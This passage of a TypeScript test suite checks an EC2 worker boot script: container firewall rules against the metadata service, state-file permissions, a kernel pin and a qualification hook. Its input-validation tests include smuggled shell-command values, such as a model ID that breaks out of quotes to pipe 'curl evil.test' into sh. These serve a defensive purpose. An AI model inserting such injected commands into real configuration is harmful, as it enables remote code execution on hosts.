        const result = runBlock(NAMED, { failInsert: new RegExp(`^${spec}$`, "u") });
        expect(result.statuses, failing).toEqual([0]);
        expect(result.rules.filter((rule) => rule.includes("rvbs+")), failing).toEqual([]);
        expect(result.rules.filter((rule) => rule.startsWith("DOCKER-USER ")), failing).toEqual([DOCKER_USER]);
        expect(result.calls.filter((call) => call.startsWith("-D ")).every((call) => call.includes("rvbs+")), failing).toBe(true);
        expect(result.state, failing).toEqual(["unavailable"]);
      }
    });

    it("a metadata rule that cannot be inserted still stops the worker (status 1), exactly as before, and no state says ready", () => {
      for (const [failing, failInsert] of [[DOCKER_USER, /^DOCKER-USER -d 169/u], [OUTPUT, /^OUTPUT -d 169/u]] as const) {
        const result = runBlock(NAMED, { failInsert });
        expect(result.statuses, failing).toEqual([1]);
        expect(result.state, failing).toEqual([]);
      }
    });

    it("is safe to call twice: the second call adds nothing and writes the state again", () => {
      const result = runBlock(NAMED, { times: 2 });
      expect(result.statuses).toEqual([0, 0]);
      expect(result.rules.filter((rule) => rule.startsWith("DOCKER-USER "))).toEqual([DOCKER_USER, NO_RESOLVER_TCP, NO_RESOLVER_UDP, HELPER_TCP, HELPER_UDP, ESTABLISHED]);
      expect(new Set(result.rules).size).toBe(result.rules.length);
      expect(result.calls.filter((call) => call.startsWith("-I ")).length).toBe(7);
      expect(result.state).toEqual(["ready"]);
    });

    it("a second call after a failed first one stays unavailable, adds no duplicate and puts nothing above the metadata rule", () => {
      const first = runBlock(NAMED, { failInsert: /physdev/ });
      const second = runBlock(NAMED, { directory: first.directory, times: 1 });
      expect(second.statuses).toEqual([0]);
      expect(second.rules.filter((rule) => rule.startsWith("DOCKER-USER "))).toEqual([DOCKER_USER]);
      expect(second.state).toEqual(["unavailable"]);
    });

    it("if the rvbs+ rules are gone or incomplete on the second call (Docker restarted), the state is written then", () => {
      const first = runBlock(NAMED);
      expect(first.state).toEqual(["ready"]);
      // Simulate the second call finding one of the five missing, beside the metadata rules.
      const rulesFile = join(first.directory, "rules");
      writeFileSync(rulesFile, first.rules.filter((rule) => rule !== HELPER_UDP).map((rule) => `${rule}\n`).join(""));
      const second = runBlock(NAMED, { directory: first.directory });
      expect(second.statuses).toEqual([0]);
      expect(second.rules.filter((rule) => rule.includes("rvbs+"))).toEqual([]);
      expect(second.rules.filter((rule) => rule.startsWith("DOCKER-USER "))).toEqual([DOCKER_USER]);
      expect(second.state).toEqual(["unavailable"]);
    });

    it("the state file is root-only to change: a content that is not exactly 'ready' (or a missing, linked or group-writable file) reads as unavailable", () => {
      const directory = mkdtempSync(join(tmpdir(), "launcher-state-"));
      const stateFile = join(directory, "setup-isolation");
      // stat here is GNU's (the launcher runs on Linux): the shim answers owner:mode as asked.
      writeFileSync(join(directory, "stat"), `#!/bin/bash\n[[ -e "$3" || -L "$3" ]] || exit 1\necho "\${FAKE_STAT:-0:644}"\n`, { mode: 0o755 });
      const read = (setup: (() => void) | undefined, stat = "0:644") => {
        rmSync(stateFile, { force: true });
        setup?.();
        const run = spawnSync("bash", ["-c", `PATH=${directory}:$PATH\nexport SETUP_ISOLATION_FILE=${stateFile} FAKE_STAT=${stat}\n${launcherFunction("setup_isolation_state")}\nsetup_isolation_state`], { encoding: "utf8" });
        expect(run.status, run.stderr).toBe(0);
        return run.stdout;
      };
      expect(read(() => writeFileSync(stateFile, "ready\n"))).toBe("ready");
      expect(read(undefined)).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, "unavailable\n"))).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, "Ready\n"))).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, "ready junk\n"))).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, ""))).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, "ready\n"), "0:666")).toBe("unavailable");
      expect(read(() => writeFileSync(stateFile, "ready\n"), "1000:644")).toBe("unavailable");
      expect(read(() => { writeFileSync(join(directory, "target"), "ready\n"); symlinkSync("target", stateFile); })).toBe("unavailable");
      if (process.getuid?.() !== 0) expect(read(() => { writeFileSync(stateFile, "ready\n"); chmodSync(stateFile, 0o000); })).toBe("unavailable");
    });

    it("hands the worker the state at container start, for a named environment only, and writes the file with mode 0644 in /etc/agentx (0700, root)", () => {
      expect(workerLauncher).toContain('if named_environment; then args+=(--env "AGENTX_SETUP_ISOLATION=$(setup_isolation_state)"); fi');
      expect(workerLauncher.indexOf("AGENTX_SETUP_ISOLATION=")).toBeLessThan(workerLauncher.indexOf('"$worker_image")'));
      expect(workerLauncher).toContain("${SETUP_ISOLATION_FILE:-/etc/agentx/setup-isolation}");
      expect(workerLauncher).toContain("chmod 0644");
      expect(stage2Script).toContain("install -d -m 0700 /etc/agentx");
      // The fact is not in the root env file the container reads at start: only the launcher's own --env carries it.
      expect(/^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(stage2Script)?.[0] ?? "").not.toContain("AGENTX_SETUP_ISOLATION");
    });

    it("leaves the legacy deployment's boot exactly as it was: no firewall rule and the host network (ruling R58)", () => {
      const launcher = workerLauncher.replace(/^block_imds\(\) \{[\s\S]*?^\}$/m, "");
      // The only place block_imds runs is behind the named-environment test.
      expect(launcher).toContain("if named_environment; then block_imds || ");
      expect(launcher.match(/block_imds/gu)).toHaveLength(1);
      expect(networkArgs(LEGACY)).toEqual(["--network", "host"]);
    });

    it("applies the rules as root before the worker starts, and does not start it when they fail", () => {
      expect(workerLauncher).toMatch(/if named_environment; then block_imds \|\| \{[^}]*exit 1; \}; fi/u);
      expect(workerLauncher.indexOf("then block_imds ||")).toBeLessThan(workerLauncher.indexOf('exec "$docker"'));
      expect(workerLauncher).toContain('mapfile -t network_args < <(worker_network_args)');
    });
  });

  it("prepares fixed private EBS runtime paths and retries the pinned contained image before starting the worker", () => {
    expect(bootText).toContain('readonly RUNTIME_SOURCE=$MOUNT_PATH/.agentx-runtime');
    expect(bootText).toContain('readonly RUNTIME_ROOT=/mnt/agentx-runtime');
    expect(bootText).toContain('mount --bind "$RUNTIME_SOURCE" "$RUNTIME_ROOT"');
    expect(bootText).toContain('readonly CANDIDATE_SCRATCH_ROOT=$RUNTIME_ROOT/candidates');
    expect(bootText).toContain('readonly EVIDENCE_ROOT=$RUNTIME_ROOT/evidence');
    expect(bootText).toContain('readonly CONTAINED_STATE_ROOT=$RUNTIME_ROOT/state');
    expect(bootText).toContain('install -d -o "$WORKER_UID" -g "$WORKER_GID" -m 0700 "$RUNTIME_SOURCE/$path"');
    expect(bootText).toContain('verifier unavailable; setup smoke withheld');
    expect(bootText).toContain("printf 'TMPDIR=/tmp\\n'");
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootText).toContain('docker pull "$CONTAINED_IMAGE"');
    expect(bootText).toContain('optional verifier image unavailable; worker continues');
    expect(bootText).toContain('pull_contained_image || true');
    expect(bootText.indexOf('prepare_contained_runtime_directories')).toBeLessThan(bootText.indexOf('pull_worker_image "$region"'));
    expect(bootText.indexOf('pull_contained_image')).toBeLessThan(bootText.indexOf('write_worker_unit "$region"'));
  });

  it("walls untrusted containers off from the host and private networks and pulls the executor image after the worker image", () => {
    // The rules live in one heredoc that CI extracts and runs as is (tests/contract/container-firewall.test.ts runs it against a fake iptables).
    expect(bootText).toContain("<<'FIREWALL'");
    expect(bootText).toContain('f() { local c=$1; shift; $c -C "$@" 2>/dev/null || $c -I "$@"; }');
    expect(bootText).toContain("f iptables DOCKER-USER -d 169.254.169.254/32 -j DROP");
    // A failure to install the rules stops the boot.
    expect(bootText).toContain('|| fail "could not wall containers off from the host and private networks"');
    // DOCKER-USER exists only once the daemon is running.
    expect(bootText.indexOf("systemctl restart docker.service")).toBeLessThan(bootText.indexOf("  wall_off_containers\n}\n"));
    // The rules are also a oneshot unit, so they return after a reboot (Docker rebuilds its chains) and land before the worker starts.
    expect(bootText).toContain("readonly FIREWALL_UNIT=rovara-container-firewall.service");
    expect(bootText).toContain("Type=oneshot");
    expect(bootText).toContain("RemainAfterExit=yes");
    expect(bootText).toMatch(/\[Unit\][^]*?After=docker\.service network-online\.target systemd-resolved\.service\nWants=network-online\.target\nBefore=\$WORKER_UNIT/);
    expect(bootText).toContain("ExecStart=/bin/bash /usr/local/libexec/rovara-container-firewall");
    // A worker must not start unless the rules are in place: it requires and follows the firewall unit.
    expect(bootText).toContain("Requires=docker.service $FIREWALL_UNIT\nAfter=docker.service $FIREWALL_UNIT network-online.target");
    expect(bootText).toContain('systemctl enable "$FIREWALL_UNIT" && bash /usr/local/libexec/rovara-container-firewall || fail');
    expect(bootText).not.toContain("rovara-imds-drop");
    expect(bootText).toContain('docker pull "$EXECUTOR_IMAGE"');
    // Unset until the control plane sets it: the pull is skipped, never a boot failure.
    expect(bootText).toContain('[[ -n "${EXECUTOR_IMAGE:-}" ]] || return 0');
    expect(bootText).toContain("pull_executor_image || true");
    expect(bootText.indexOf('pull_worker_image "$region"')).toBeLessThan(bootText.indexOf("pull_executor_image || true"));
    expect(bootText.indexOf("pull_executor_image || true")).toBeLessThan(bootText.indexOf('write_worker_unit "$region"'));
  });

  describe("the kernel stays the one the runtime was qualified on (HARDEN-C I-4, KERNELPIN)", () => {
    // One line, because the user data is within a few dozen bytes of its ceiling; the test runs that very line against a copy of dnf.conf.
    const pinLine = bootScript.split("\n").find((line) => line.includes("exclude=kernel*")) ?? "";
    const run = (dnfConf: string | undefined) => {
      const root = mkdtempSync(join(tmpdir(), "boot-kernel-pin-"));
      const conf = join(root, "dnf.conf");
      if (dnfConf !== undefined) writeFileSync(conf, dnfConf);
      const script = `set -euo pipefail\n${pinLine.split("/etc/dnf/dnf.conf").join(conf)}\n${pinLine.split("/etc/dnf/dnf.conf").join(conf)}\necho still-running\n`;
      const result = spawnSync("bash", ["-c", script], { encoding: "utf8" });
      return { result, text: existsSync(conf) ? readFileSync(conf, "utf8") : undefined };
    };

    it("pins in ensure_docker, before dnf installs anything", () => {
      expect(pinLine).not.toBe("");
      const ensureDocker = /^ensure_docker\(\) \{\n([\s\S]*?)\n\}\n/m.exec(bootScript)?.[1] ?? "";
      expect(ensureDocker.indexOf("exclude=kernel*")).toBeGreaterThanOrEqual(0);
      expect(ensureDocker.indexOf("exclude=kernel*")).toBeLessThan(ensureDocker.indexOf("install_docker_package"));
    });

    it("excludes kernel packages from dnf in its [main] section, once however often the boot runs", () => {
      const { result, text } = run("[main]\ngpgcheck=1\ninstallonly_limit=3\n");
      expect(result.status, result.stderr).toBe(0);
      expect(result.stdout).toContain("still-running");
      expect(text).toBe("[main]\ngpgcheck=1\ninstallonly_limit=3\nexclude=kernel*\n");
    });

    it("leaves a file that already has an exclude line alone, instead of writing a second one", () => {
      const { result, text } = run("[main]\nexclude=foo*\ngpgcheck=1\n");
      expect(result.status, result.stderr).toBe(0);
      expect(text).toBe("[main]\nexclude=foo*\ngpgcheck=1\n");
    });

    it("never invents a configuration and never stops the boot: a host with no dnf.conf is left alone", () => {
      const { result, text } = run(undefined);
      expect(result.status, result.stderr).toBe(0);
      expect(result.stdout).toContain("still-running");
      expect(text).toBeUndefined();
    });
  });

  it("renders a script bash accepts", () => {
    const checked = spawnSync("bash", ["-n"], { input: ec2WorkerBootScript(config, bootScript), encoding: "utf8" });
    expect(checked.status, checked.stderr).toBe(0);
  });

  it.each([
    ["a model ID that breaks out of its quotes", { modelId: "x'; curl evil.test | sh; '" }],
    ["a model ID with a space", { modelId: "claude sonnet" }],
    ["a control plane URL over plain HTTP", { controlPlaneUrl: "http://control.example.test" }],
    ["a control plane URL with a quote", { controlPlaneUrl: "https://control.example.test/'x" }],
    ["an image pinned by tag", { workerImage: "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx-worker:latest" }],
    ["an image outside ECR", { workerImage: `docker.io/library/node@sha256:${"c".repeat(64)}` }],
    ["a public key with a newline", { invokePublicKey: "MFkw\nEwYH" }],
    ["a log group with a space", { logGroupName: "/agentx/worker logs" }],
    ["a generation of 0", { generation: 0 }],
    ["an unknown cache retention", { promptCacheRetention: "forever" }],
  ])("refuses %s", (_name, override) => {
    expect(() => ec2WorkerBootScript({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
    expect(() => ec2WorkerUserData({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
  });

  it("takes the stage 2 hash as 64 lower-case hex digits, exports it for a named environment, and requires it there", () => {
    const sha = "ab".repeat(32);
    expect(AGENTX_BOOT_STAGE2_SHA256).toBe("AGENTX_BOOT_STAGE2_SHA256");
    const named = { ...config, environmentKind: "named" as const, bootStage2Sha256: sha };
    expect(ec2WorkerBootScript(named, bootScript)).toContain(`export AGENTX_BOOT_STAGE2_SHA256='${sha}'`);
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_BOOT_STAGE2_SHA256=");
    for (const bad of ["", "AB".repeat(32), "ab".repeat(31), "ab".repeat(33), `${"ab".repeat(31)}a'`, `${"a".repeat(63)};`, "none"]) {
      expect(() => Ec2WorkerBootConfigSchema.parse({ ...named, bootStage2Sha256: bad }), JSON.stringify(bad)).toThrow();
    }
    // A named environment boots stage 2 from its image, so it cannot launch without the hash; the legacy deployment never has one.
    expect(() => Ec2WorkerBootConfigSchema.parse({ ...config, environmentKind: "named" })).toThrow(/bootStage2Sha256/);
    expect(Ec2WorkerBootConfigSchema.parse({ ...config }).bootStage2Sha256).toBeUndefined();
  });

  it("refuses unknown fields", () => {
    expect(() => Ec2WorkerBootConfigSchema.parse({ ...config, extra: "x" })).toThrow();
  });
});


const executorImage = `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/executor@sha256:${"e".repeat(64)}`;
const runId = "0b6e6f0e-5d3b-4f0e-9d3a-2f1c4b7a8e90";
const roleId = "AROAEXAMPLEROLEID123";
const instanceId = "i-0123456789abcdef0";
const qualification = { bucket: "agentx-agentxlivetest123-control-artifacts82dd59a1-syx0unxsewcf", roleId, profile: "linux-arm64-web-api-v1" } as const;
/** The key prefix the instance role's `${aws:userid}` grant allows: <role unique id>:<instance id>. */
const qualificationPrefix = `e2e-runtime/${roleId}:${instanceId}/`;

/** Runs one shell function of the boot script on its own, with the script's own fixed paths replaced by the test's. */
function runBootFunction(name: string, args: string[], environment: Record<string, string>, replace: Array<[string, string]> = []): { status: number | null; stdout: string; stderr: string } {
  const start = bootText.indexOf(`\n${name}() {`);
  const end = bootText.indexOf("\n}\n", start);
  expect(start, `${name} is in boot.sh or boot-stage2.sh`).toBeGreaterThan(-1);
  let text = bootText.slice(start + 1, end + 3);
  for (const [from, to] of replace) text = text.split(from).join(to);
  const program = `log() { printf 'agentx-boot: %s\\n' "$*" >&2; }\n${text}\n${name} "$@"`;
  const ran = spawnSync("bash", ["-c", program, "bash", ...args], { encoding: "utf8", env: { PATH: process.env.PATH ?? "", ...environment } });
  return { status: ran.status, stdout: ran.stdout, stderr: ran.stderr };
}

describe("the executor image on the worker", () => {
  it("passes EXECUTOR_IMAGE through the boot config, only when the release has one, and only as an ECR image pinned by digest", () => {
    expect(ec2WorkerBootScript({ ...config, executorImage }, bootScript)).toContain(`export EXECUTOR_IMAGE='${executorImage}'`);
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export EXECUTOR_IMAGE=");
    for (const bad of [
      "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/executor:latest",
      `docker.io/library/node@sha256:${"c".repeat(64)}`,
      `${executorImage}';touch /tmp/bad`,
    ]) expect(() => ec2WorkerBootScript({ ...config, executorImage: bad }, bootScript), bad).toThrow();
  });

  it("writes EXECUTOR_IMAGE into worker.env, so docker exec agentx-worker processes see it, and writes nothing when it is unset", () => {
    const dir = mkdtempSync(join(tmpdir(), "boot-env-"));
    const file = join(dir, "worker.env");
    const base = { AGENTX_CONTROL_PLANE_URL: "https://c.example", AGENTX_MODEL_PROVIDER: "p", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short", AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: runId, AGENTX_SESSION_GENERATION: "1" };
    // Only the root-owned install steps are replaced; every line that writes the file's contents runs as in boot.sh.
    const replace: Array<[string, string]> = [
      ['install -d -m 0700 "$(dirname "$WORKER_ENV_FILE")"', ":"],
      ['install -m 0600 /dev/null "$WORKER_ENV_FILE"', ': >"$WORKER_ENV_FILE"'],
    ];
    const withIt = runBootFunction("write_worker_environment", ["us-east-1"], { ...base, EXECUTOR_IMAGE: executorImage, WORKER_ENV_FILE: file, MOUNT_PATH: "/mnt/workspace" }, replace);
    expect(withIt.status, withIt.stderr).toBe(0);
    const lines = readFileSync(file, "utf8").split("\n");
    expect(lines).toContain(`EXECUTOR_IMAGE=${executorImage}`);
    expect(lines.filter((line) => line.startsWith("EXECUTOR_IMAGE="))).toHaveLength(1);
    const without = runBootFunction("write_worker_environment", ["us-east-1"], { ...base, WORKER_ENV_FILE: file, MOUNT_PATH: "/mnt/workspace" }, replace);
    expect(without.status, without.stderr).toBe(0);
    expect(readFileSync(file, "utf8")).not.toContain("EXECUTOR_IMAGE");
  });
});

describe("the task sandbox on the worker", () => {
  it("tells the worker its own image as the task sandbox's and that it runs on EC2, so the local shell is refused there", () => {
    const image = `registry.example.test/agentx/worker@sha256:${"c".repeat(64)}`;
    const dir = mkdtempSync(join(tmpdir(), "boot-env-"));
    const file = join(dir, "worker.env");
    const base = { AGENTX_CONTROL_PLANE_URL: "https://c.example", AGENTX_MODEL_PROVIDER: "p", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short", AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: runId, AGENTX_SESSION_GENERATION: "1", AGENTX_WORKER_IMAGE: image };
    const replace: Array<[string, string]> = [
      ['install -d -m 0700 "$(dirname "$WORKER_ENV_FILE")"', ":"],
      ['install -m 0600 /dev/null "$WORKER_ENV_FILE"', ': >"$WORKER_ENV_FILE"'],
    ];
    const ran = runBootFunction("write_worker_environment", ["us-east-1"], { ...base, WORKER_ENV_FILE: file, MOUNT_PATH: "/mnt/workspace" }, replace);
    expect(ran.status, ran.stderr).toBe(0);
    const lines = readFileSync(file, "utf8").split("\n");
    expect(lines).toContain(`AGENTX_SANDBOX_IMAGE=${image}`);
    expect(lines).toContain("AGENTX_RUNTIME=ec2");
    expect(lines.some((line) => line.startsWith("AGENTX_TASK_SHELL"))).toBe(false);
  });

  it("mounts the workspace inside the worker at the path it has on the host, so the sandbox's bind mount names the same files", () => {
    expect(bootText).toContain('--volume "$MOUNT_PATH:$MOUNT_PATH"');
  });
});

describe("the opt-in TEST qualification hook", () => {
  it("renders the validated qualification settings into the boot config, only when asked for, and refuses a malformed role ID, profile or bucket", () => {
    const rendered = ec2WorkerBootScript({ ...config, e2eQualification: qualification }, bootScript);
    expect(rendered).toContain(`export AGENTX_E2E_QUALIFICATION_ROLE_ID='${roleId}'`);
    // The prefix is no longer a user-data value: the instance builds it from its own ID.
    expect(rendered).not.toContain("AGENTX_E2E_QUALIFICATION_PREFIX");
    expect(rendered).toContain("export AGENTX_E2E_QUALIFICATION_PROFILE='linux-arm64-web-api-v1'");
    expect(rendered).toContain(`export AGENTX_E2E_QUALIFICATION_BUCKET='${qualification.bucket}'`);
    // The boot script itself carries no bucket name: it comes from this configuration.
    expect(bootText).not.toMatch(/control-artifacts|agentxlivetest/);
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_E2E_QUALIFICATION");
    for (const bad of [
      { ...qualification, roleId: "" },
      { ...qualification, roleId: "AIDAEXAMPLEUSERID1234" },
      { ...qualification, roleId: "AROAshort" },
      { ...qualification, roleId: "AROAEXAMPLEROLEID123/../x" },
      { ...qualification, roleId: "AROAEXAMPLEROLEID123:i-0123456789abcdef0" },
      { ...qualification, roleId: "AROAEXAMPLEROLEID123*" },
      { ...qualification, roleId: "aroaexampleroleid123" },
      { ...qualification, roleId: "AROAEXAMPLEROLEID123'; touch /tmp/bad" },
      { ...qualification, prefix: `e2e-runtime/${runId}/` },
      { ...qualification, profile: "linux-arm64-docker-v1" },
      { ...qualification, bucket: "Bucket'; touch /tmp/bad" },
    ]) expect(() => ec2WorkerBootScript({ ...config, e2eQualification: bad } as Ec2WorkerBootConfig, bootScript), JSON.stringify(bad)).toThrow();
  });

  it("starts the hook only when both the role ID and the profile are set, as its own unit, passing it the instance ID and the executor image, and never lets it fail the boot", () => {
    const dir = mkdtempSync(join(tmpdir(), "boot-hook-"));
    const bin = join(dir, "bin");
    mkdirSync(bin);
    const log = join(dir, "calls.log");
    writeFileSync(join(bin, "systemd-run"), `#!/bin/bash\nprintf '%s\\n' "$*" >>"${log}"\n`);
    chmodSync(join(bin, "systemd-run"), 0o755);
    const replace: Array<[string, string]> = [["write_e2e_qualification_script", ":"]];
    const run = (environment: Record<string, string>) => runBootFunction("start_e2e_qualification", ["us-east-1", instanceId], { ...environment, PATH: `${bin}:${process.env.PATH ?? ""}` }, replace);
    for (const environment of [{}, { AGENTX_E2E_QUALIFICATION_ROLE_ID: qualification.roleId }, { AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile }, { AGENTX_E2E_QUALIFICATION_ROLE_ID: "", AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile }]) {
      expect(run(environment).status).toBe(0);
    }
    expect(existsSync(log)).toBe(false);
    const enabled = { AGENTX_E2E_QUALIFICATION_ROLE_ID: qualification.roleId, AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile, AGENTX_E2E_QUALIFICATION_BUCKET: qualification.bucket, EXECUTOR_IMAGE: executorImage };
    const started = run(enabled);
    expect(started.status, started.stderr).toBe(0);
    const call = readFileSync(log, "utf8");
    expect(call).toContain("--unit=agentx-e2e-qualification");
    expect(call).toContain("--no-block");
    expect(call).toContain(`/bin/bash /usr/local/libexec/agentx-e2e-qualification us-east-1 ${qualification.bucket} ${qualification.roleId} ${instanceId} ${qualification.profile} ${executorImage}`);
    // systemd-run failing is logged, never returned as a failure of the boot.
    writeFileSync(join(bin, "systemd-run"), "#!/bin/bash\nexit 1\n");
    const failed = run(enabled);
    expect(failed.status).toBe(0);
    expect(failed.stderr).toContain("could not start the E2E qualification");
    // It starts after the worker unit does, and a failure to start it is only logged.
    expect(bootText).toContain('start_e2e_qualification "$region" "$instance_id" || log "the E2E qualification did not start"');
    expect(bootText.indexOf('systemctl enable --now "$WORKER_UNIT"')).toBeLessThan(bootText.indexOf('start_e2e_qualification "$region" "$instance_id" ||'));
  });

  it("carries a hook script bash accepts, with every path quoted, that logs and uploads no secret", () => {
    expect(qualificationScript).not.toBe("");
    expect(spawnSync("bash", ["-n"], { input: qualificationScript, encoding: "utf8" }).status).toBe(0);
    // No unquoted expansion of a path or key: once the double-quoted strings are taken out, none of them is left.
    const unquoted = qualificationScript.replace(/"(?:[^"\\]|\\.)*"/g, '""');
    expect(unquoted).not.toMatch(/\$\{?(BUCKET|PREFIX|ROLE_ID|INSTANCE_ID|PROFILE|REGION|EXECUTOR|EVIDENCE_HOST|EVIDENCE_CONTAINER|STAGE|fetched|proposal)\b/);
    expect(qualificationScript).not.toMatch(/AWS_SECRET|AWS_SESSION_TOKEN|X-aws-ec2-metadata-token|get-secret-value/);
    expect(qualificationScript).toContain("--server-side-encryption AES256");
    // A temporary directory that cannot be made stops the script before it reads or writes anything.
    expect(qualificationScript).toContain("STAGE=$(mktemp -d) || exit 1\nreadonly STAGE");
    expect(qualificationScript).toContain("--user node agentx-worker /usr/local/bin/node /opt/agentx/packages/verifier/dist/install-qualification-cli.js");
  });

  /** Runs the hook script against fake aws, docker, curl, chown and timeout commands that record every call. */
  const hookArgs = ["us-east-1", qualification.bucket, qualification.roleId, instanceId, qualification.profile, executorImage];
  type HookOptions = { args?: string[]; challenge?: "present" | "missing"; qualifier?: number; failureFile?: string; padBytes?: number; staleFailure?: string; link?: boolean; proposalBytes?: number; ping?: "up" | "down"; pingBody?: string; wait?: number; executor?: "present" | "missing" | "pullable" };
  function runHook(options: HookOptions = {}) {
    const dir = mkdtempSync(join(tmpdir(), "boot-hook-run-"));
    const bin = join(dir, "bin");
    const hostRoot = join(dir, "host");
    const evidence = join(hostRoot, "mnt/workspace/.agentx-runtime/evidence");
    const objects = join(dir, "s3");
    for (const path of [bin, evidence, objects]) mkdirSync(path, { recursive: true });
    const calls = join(dir, "calls.log");
    const fake = (name: string, body: string) => { writeFileSync(join(bin, name), `#!/bin/bash\n${body}\n`); chmodSync(join(bin, name), 0o755); };
    fake("aws", `printf 'aws %s\\n' "$*" >>"${calls}"
case "$2" in
  get-login-password) printf 'registry-password' ;;
  get-object)
    last=; while (($#)); do last=$1; shift; done
    [[ "$FAKE_CHALLENGE" == missing ]] && { echo "NoSuchKey" >&2; exit 254; }
    printf '{"challengeId":"c"}' >"$last" ;;
  put-object)
    key=; body=; while (($#)); do [[ "$1" == --key ]] && key=$2; [[ "$1" == --body ]] && body=$2; shift; done
    mkdir -p "${objects}/$(dirname "$key")"; cp "$body" "${objects}/$key" ;;
esac`);
    fake("docker", `printf 'docker %s\\n' "$*" >>"${calls}"
case "$1 $2" in
  "image inspect") [[ "$FAKE_EXECUTOR" == present ]] && exit 0; [[ "$FAKE_EXECUTOR" == pullable && -e "${dir}/pulled" ]] && exit 0; exit 1 ;;
esac
case "$1" in
  login) cat >/dev/null; exit 0 ;;
  pull) [[ "$FAKE_EXECUTOR" == pullable ]] && touch "${dir}/pulled"; exit 0 ;;
esac
if [[ "$*" == *e2e-model-canary-cli.js* ]]; then
  # The model check server's fixed lines go to stderr, as the real one's do.
  [[ "$FAKE_QUALIFIER" == 0 ]] && printf '%s\n' "model-check: request not readable (SlowDown)" >&2
  exit 0
fi
out=; failure=; while (($#)); do [[ "$1" == --out ]] && out=$2; [[ "$1" == --failure-out ]] && failure=$2; shift; done
if [[ "$FAKE_QUALIFIER" != 0 ]]; then
  if [[ -n "$failure" && -n "\${FAKE_FAILURE_FILE:-}" ]]; then
    # A large file is built here, not passed in: Linux refuses a single environment string of 128 KiB or more (E2BIG), which macOS does not.
    body=$FAKE_FAILURE_FILE; [[ -n "\${FAKE_FAILURE_PAD:-}" ]] && body=\${body/__PAD__/$(head -c "$FAKE_FAILURE_PAD" /dev/zero | tr '\\0' 'y')}
    if [[ "\${FAKE_LINK:-}" == 1 ]]; then printf '%s' "$body" >"${evidence}/target"; ln -s target "${evidence}/$(basename "$failure")"
    else printf '%s' "$body" >"${evidence}/$(basename "$failure")"; fi
  fi
  exit "$FAKE_QUALIFIER"
fi
if [[ "\${FAKE_LINK:-}" == 1 ]]; then head -c "$FAKE_PROPOSAL_BYTES" /dev/zero | tr '\\0' 'x' >"${evidence}/target"; ln -s target "${evidence}/$(basename "$out")"
else head -c "$FAKE_PROPOSAL_BYTES" /dev/zero | tr '\\0' 'x' >"${evidence}/$(basename "$out")"; fi`);
    // macOS dd has no iflag=nofollow: the shim refuses a symlink the way GNU dd does, and runs the plain copy otherwise.
    // GNU dd (Linux, as on the runner) is used as it is, so the real iflag=nofollow is what the test exercises there.
    fake("dd", `if /bin/dd iflag=nofollow if=/dev/null of=/dev/null count=0 2>/dev/null; then exec /bin/dd "$@"; fi
a=(); link=; for x in "$@"; do if [[ "$x" == iflag=nofollow ]]; then nf=1; continue; fi; [[ "$x" == if=* && -L "\${x#if=}" ]] && link=1; a+=("$x"); done
[[ -n "$nf" ]] || { echo "dd without iflag=nofollow" >&2; exit 9; }
[[ -z "$link" ]] || exit 1
exec /bin/dd "\${a[@]}"`);
    fake("curl", `[[ "$FAKE_PING" == down ]] && exit 22; if [[ -n "\${FAKE_PING_BODY:-}" ]]; then printf '%s\\n' "$FAKE_PING_BODY"; else echo '{"status":"Healthy","activeOperations":0,"invocationFeatures":["task.readiness","task.workflowChecks"]}'; fi`);
    fake("chown", `printf 'chown %s\\n' "$*" >>"${calls}"`);
    // macOS mv has no -T: the shim keeps the test honest about the flag being passed and runs the plain move.
    fake("mv", `printf 'mv %s\\n' "$*" >>"${calls}"; a=(); for x in "$@"; do [[ "$x" == -fT ]] && x=-f; a+=("$x"); done; exec /bin/mv "\${a[@]}"`);
    fake("timeout", `while [[ "$1" == -* ]]; do shift; done; shift; exec "$@"`);
    if (options.staleFailure !== undefined) writeFileSync(join(evidence, "runtime-install-failure.json"), options.staleFailure);
    const result = spawnSync("bash", ["-c", qualificationScript, "bash", ...(options.args ?? hookArgs)], {
      encoding: "utf8",
      env: {
        ...(options.failureFile === undefined ? {} : { FAKE_FAILURE_FILE: options.failureFile }), ...(options.padBytes === undefined ? {} : { FAKE_FAILURE_PAD: String(options.padBytes) }),
        PATH: `${bin}:${process.env.PATH ?? ""}`, AGENTX_HOST_ROOT: hostRoot, TMPDIR: dir,
        AGENTX_E2E_QUALIFICATION_POLL_SECONDS: "0", AGENTX_E2E_QUALIFICATION_HEALTHY_WAIT_SECONDS: String(options.wait ?? 1), AGENTX_E2E_QUALIFICATION_CHALLENGE_WAIT_SECONDS: String(options.wait ?? 1),
        FAKE_CHALLENGE: options.challenge ?? "present", FAKE_QUALIFIER: String(options.qualifier ?? 0), FAKE_PROPOSAL_BYTES: String(options.proposalBytes ?? 64), FAKE_PING: options.ping ?? "up", FAKE_PING_BODY: options.pingBody ?? "",
        FAKE_EXECUTOR: options.executor ?? "present", ...(options.link ? { FAKE_LINK: "1" } : {}), AGENTX_E2E_QUALIFICATION_PULL_SECONDS: "5",
      },
    });
    const called = existsSync(calls) ? readFileSync(calls, "utf8").split("\n").filter(Boolean) : [];
